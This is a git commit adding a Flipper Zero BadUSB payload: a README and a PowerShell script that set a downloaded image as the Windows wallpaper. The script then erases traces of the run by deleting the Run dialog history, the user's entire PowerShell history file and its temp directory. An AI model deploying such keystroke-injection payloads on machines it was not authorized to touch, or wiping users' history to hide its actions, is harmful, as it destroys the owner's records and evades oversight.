9f67df5b3565db2ca6c304f0d080ed9a01469624
Volodymyr Stelmakh <volod.stelmakh@gmail.com>
2024-01-25 18:46:03 +0100

    add wallpaper badusb

---
+++ badusb/windows/wallpaper/README.md
@@ -0,0 +1,15 @@
+# Set image as wallpaper
+This script is downloading provided image and setting it as desktop wallpaper. All the execution traces are removed after execution.
+
+## Target
+- Windows 10
+- Windows 11
+
+## Setup
+1. Provide a valid link for image in [script.txt](./script.txt#L11).
+2. Rename `script.txt` to any desired script name. Remeber `.txt` extension is required.
+3. Upload `%any-name%.txt` to Flipper `badusb` dir.
+
+## Run
+Changes applied immediately after execution.
+> Downloaded image saved on desktop with name `wallpaper-717c63f7864fa8c725ebd30a15428302.jpg`.
---
+++ badusb/windows/wallpaper/start.ps1
@@ -0,0 +1,55 @@
+[string] $location = "$env:tmp\vsbadusbpayload"
+
+function main {
+    setWallpaper "$env:userprofile\Desktop\wallpaper-717c63f7864fa8c725ebd30a15428302.jpg"
+    clearRunHistory
+    clearPowershellHistory
+    removePayloadDirectory
+}
+
+function setWallpaper([string] $image, [string] $style = "fill") {
+    [int] $styleCode = Switch ($style) {
+        "fill" {10}
+        "fit" {6}
+        "stretch" {2}
+        "tile" {0}
+        "center" {0}
+        "span" {22}
+    }
+   [int] $tileCode = $(if ($style -eq "tile") {1} else {0})
+   New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $styleCode -Force
+   New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value $tileCode -Force
+
+   Add-Type -TypeDefinition @" 
+       using System; 
+       using System.Runtime.InteropServices;
+
+       public class Params {
+            [DllImport("User32.dll", CharSet=CharSet.Unicode)] 
+            public static extern int SystemParametersInfo (Int32 uAction, Int32 uParam, String lpvParam, Int32 fuWinIni);
+       }
+"@
+
+    $setWallpaper = 0x0014
+    $updateIniFile = 0x01
+    $sendChangeEvent = 0x02
+    $fWinIni = $updateIniFile -bor $sendChangeEvent
+    [Params]::SystemParametersInfo($setWallpaper, 0, $image, $fWinIni)
+}
+
+function clearRunHistory {
+    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+}
+
+function clearPowershellHistory {
+    $historyLocation = (Get-PSreadlineOption).HistorySavePath    
+    if (Test-Path $historyLocation) {
+        Remove-Item $historyLocation
+    }
+}
+
+function removePayloadDirectory {
+    Remove-Item "$location" -Recurse -Force -ErrorAction SilentlyContinue
+}
+
+main
